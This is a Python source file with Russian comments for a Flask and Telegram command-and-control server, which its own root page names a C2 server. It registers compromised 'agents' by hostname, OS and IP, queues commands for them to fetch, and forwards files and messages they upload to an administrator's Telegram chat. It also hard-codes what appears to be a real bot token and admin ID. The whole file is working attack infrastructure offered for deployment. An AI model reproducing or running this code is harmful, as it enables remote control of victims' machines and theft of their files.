#!/usr/bin/env python3
# bot.py — для BotHost (bot-hosting.ru)
# Загрузите этот файл в корень проекта бота.
# c2_server.py - для BotHost (Flask + Telegram бот)

import os, json, time, base64, threading, logging
from flask import Flask, request, jsonify
import telebot
from telebot import apihelper, types

# === НАСТРОЙКИ (задайте через переменные окружения или прямо здесь) ===
TOKEN = os.environ.get("BOT_TOKEN", "8800452125:AAETWvKIeP6BgDKWaSAmAhGm6WAq8TCm7pc")
ADMIN_ID = int(os.environ.get("ADMIN_ID", "6099860667"))
SECRET_KEY = os.environ.get("SECRET_KEY", "R0T-K1T")

# === ДОМЕН ВАШЕГО СЕРВЕРА (тот, на котором вы видели 404) ===
# Замените на ваш реальный домен, который вы получили от BotHost
# Например: "https://bot-123456.bothost.tech"
WEBHOOK_URL = os.environ.get("WEBHOOK_URL", "https://bot-1786635592_9600_swagg3r.bothost.tech")

# === СОЗДАНИЕ БОТА И FLASK ===
bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

# Хранилища
agents = {}
commands_queue = {}

# === ФУНКЦИЯ ОТПРАВКИ СООБЩЕНИЙ АДМИНУ ===
def send_to_admin(text, file=None):
    try:
        if file:
            bot.send_document(ADMIN_ID, file, caption=text)
        else:
            bot.send_message(ADMIN_ID, text)
    except Exception as e:
        print(f"Ошибка отправки в Telegram: {e}")

# === ЭНДПОИНТЫ ДЛЯ АГЕНТОВ ===
@app.route('/register', methods=['POST'])
def register():
    data = request.json
    if not data or data.get('key') != SECRET_KEY:
        return jsonify({"error": "Invalid key"}), 403
    agent_id = data.get('agent_id')
    if not agent_id:
        return jsonify({"error": "agent_id required"}), 400
    agents[agent_id] = {
        "hostname": data.get("hostname", "?"),
        "os": data.get("os", "?"),
        "ip": data.get("ip", "?"),
        "last_seen": time.time()
    }
    send_to_admin(f"🆕 Агент зарегистрирован: {agent_id} ({agents[agent_id]['hostname']})")
    return jsonify({"status": "ok"})

@app.route('/send_message', methods=['POST'])
def send_message():
    data = request.json
    if not data or data.get('key') != SECRET_KEY:
        return jsonify({"error": "Invalid key"}), 403
    agent_id = data.get('agent_id')
    text = data.get('text', '')
    if not agent_id or not text:
        return jsonify({"error": "agent_id and text required"}), 400
    send_to_admin(f"💬 [{agent_id}]: {text}")
    return jsonify({"status": "ok"})

@app.route('/send_file', methods=['POST'])
def send_file():
    agent_id = request.form.get('agent_id')
    key = request.form.get('key')
    if key != SECRET_KEY:
        return jsonify({"error": "Invalid key"}), 403
    if 'file' not in request.files:
        return jsonify({"error": "No file"}), 400
    file = request.files['file']
    caption = request.form.get('caption', f"📎 Файл от {agent_id}")
    try:
        bot.send_document(ADMIN_ID, file, caption=caption)
    except Exception as e:
        return jsonify({"error": str(e)}), 500
    return jsonify({"status": "ok"})

@app.route('/get_commands', methods=['POST'])
def get_commands():
    data = request.json
    if not data or data.get('key') != SECRET_KEY:
        return jsonify({"error": "Invalid key"}), 403
    agent_id = data.get('agent_id')
    if not agent_id:
        return jsonify({"error": "agent_id required"}), 400
    cmds = commands_queue.get(agent_id, [])
    commands_queue[agent_id] = []
    return jsonify({"commands": cmds})

@app.route('/add_command', methods=['POST'])
def add_command():
    data = request.json
    if not data or data.get('key') != SECRET_KEY:
        return jsonify({"error": "Invalid key"}), 403
    agent_id = data.get('agent_id')
    command = data.get('command')
    if not agent_id or not command:
        return jsonify({"error": "agent_id and command required"}), 400
    if agent_id not in commands_queue:
        commands_queue[agent_id] = []
    commands_queue[agent_id].append(command)
    return jsonify({"status": "ok"})

# === ЭНДПОИНТ ДЛЯ ВЕБХУКА TELEGRAM ===
@app.route('/webhook', methods=['POST'])
def webhook():
    if request.headers.get('content-type') == 'application/json':
        json_string = request.get_data().decode('utf-8')
        update = types.Update.de_json(json_string)
        bot.process_new_updates([update])
        return '', 200
    else:
        return '', 403

# === КОРНЕВОЙ ПУТЬ (для проверки) ===
@app.route('/')
def index():
    return "C2 Server is running. Webhook URL: " + WEBHOOK_URL, 200

# === ЗАПУСК ===
if __name__ == '__main__':
    # Устанавливаем вебхук
    try:
        bot.remove_webhook()
        bot.set_webhook(url=WEBHOOK_URL + '/webhook')
        print(f"✅ Webhook установлен: {WEBHOOK_URL}/webhook")
    except Exception as e:
        print(f"⚠️ Ошибка установки вебхука: {e}")
        print("Переключаюсь на polling (может не работать)")
        threading.Thread(target=bot.polling, kwargs={'none_stop': True}, daemon=True).start()

    # Запускаем Flask-сервер
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
